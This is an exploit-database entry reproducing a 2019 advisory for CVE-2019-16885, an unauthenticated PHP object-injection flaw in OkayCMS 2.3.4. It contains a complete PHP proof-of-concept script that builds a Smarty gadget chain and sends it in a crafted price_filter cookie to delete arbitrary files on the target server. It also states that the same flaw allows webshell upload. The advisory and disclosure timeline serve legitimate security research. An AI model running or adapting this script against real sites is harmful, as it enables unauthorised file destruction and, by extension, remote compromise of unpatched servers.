@@ -1,0 +1,149 @@
+id: 33635
+date: 12/08/2019
+title: OkayCMS 2.3.4 Remote Code Execution Exploit
+author: Wolfgang Hotwagner
+cves: CVE-2019-16885
+
+# Unauthenticated remote code execution in OkayCMS
+
+## Overview
+* Target: OkayCMS
+* Vendor: OkayCMS
+* Version: all versions including 2.3.4
+* CVE: CVE-2019-16885
+* Accessibility: Local
+* Severity: Critical
+* Author: Wolfgang Hotwagner (AIT Austrian Institute of Technology)
+
+## Summary
+[OkayCMS is a simple and functional content managment system for an online store.](https://okay-cms.com)
+
+## Vulnerability Description
+An unauthenticated attacker can upload a webshell by injecting a malicious php-object via a crafted cookie. This could happen at two places. First in "view/ProductsView.php" using the cookie "price_filter" or in "api/Comparison.php" via the cookie "comparison". Both cookies will pass untrusted values to a unserialize()-function. The following code shows the vulnerability in "api/Comparison.php":
+
+```
+$items = !empty($_COOKIE['comparison']) ? unserialize($_COOKIE['comparison']) : array();
+```
+
+The unsafe deserialization also occurs in "view/ProductsView.php":
+
+```
+$price_filter = unserialize($_COOKIE['price_filter']);
+```
+
+
+## Proof of Concept
+The following code utilizes an object of the smarty-component to delete arbitrary files from the webhost:
+
+```
+<?php
+
+if($argc != 3)
+{
+  print "usage: $argv[0] <url> <file>\n";
+  exit(1);
+}
+
+$url = $argv[1];
+$file = $argv[2];
+
+class Smarty_Internal_CacheResource_File {
+
+        public function releaseLock(Smarty $smarty, Smarty_Template_Cached $cached) {
+            $cached->is_locked = false;
+            @unlink($cached->lock_id);
+        }
+}
+
+class Smarty_Template_Cached {
+    public $handler = null;
+    public $is_locked = true;
+    public $lock_id = "";
+
+    public function __construct() {
+       $this->lock_id = $GLOBALS['file'];
+       $this->handler = new Smarty_Internal_CacheResource_File;
+    }
+}
+
+
+class Smarty {
+    public $cache_locking = true;
+}
+
+class Smarty_Internal_Template  {
+    public $smarty = null;
+    public $cached = null;
+
+    public function __construct() {
+        $this->smarty = new Smarty;
+        $this->cached = new Smarty_Template_Cached;
+    }
+
+    public function __destruct(){
+        if ($this->smarty->cache_locking && isset($this->cached) && $this->cached->is_locked) {
+            $this->cached->handler->releaseLock($this->smarty, $this->cached);
+        }
+    }
+}
+
+$obj = new Smarty_Internal_Template();
+
+$serialized = serialize($obj);
+
+$un = unserialize($serialized);
+
+$headers = [
+  'Accept-Language: en-US,en;q=0.5',
+  "Referer: $url/en/catalog/myagkie-igrushki",
+  'Cookie: ' . 'price_filter=' . urlencode($serialized) . ';'
+];
+
+$curl = curl_init();
+curl_setopt_array($curl, [
+    CURLOPT_HTTPHEADER => $headers,
+    CURLOPT_RETURNTRANSFER => true,
+    CURLOPT_URL => "$url/en/catalog/myagkie-igrushki/sort-price",
+    CURLOPT_USERAGENT => 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
+]);
+$resp = curl_exec($curl);
+if(curl_error($curl)) {
+   print curl_error($curl);
+}
+curl_close($curl);
+
+
+print $resp;
+
+?>
+```
+
+## Notes
+Because of the high severity of this vulnerability we will not release a full exploit for the remote code execution.
+
+## Vulnerable Versions
+ versions of the “Lite”-branch including 2.3.4. Pro Versions prior 3.0.2 might have been affected too.
+
+## Tested Versions
+OkayCMS-Lite 2.3.4
+
+## Impact
+An unauthenticated attacker could upload a webshell to the server and execute commands remotely.
+
+## Mitigation
+At the moment of this publication the vendor has only patched the paid version of the CMS, so a change to other free software or an upgrade to the Pro version of OkayCMS is recommended.
+
+## References:
+*  https://nvd.nist.gov/vuln/detail/CVE-2019-16885
+
+## Vendor Contact Timeline
+
+* `2019-08-29` Contacting the vendor
+* `2019-09-04` Vendor replied
+* `2019-09-17` Vendor released commercial version 3.0.2 including a bugfix
+* `2019-09-29` Public disclosure
+
+## Advisory URL
+[https://www.ait.ac.at/ait-sa-20191129-01-unauthenticated-remote-code-execution-okaycms](https://www.ait.ac.at/ait-sa-20191129-01-unauthenticated-remote-code-execution-okaycms)
+
+#  0day.today [2023-03-24]  #
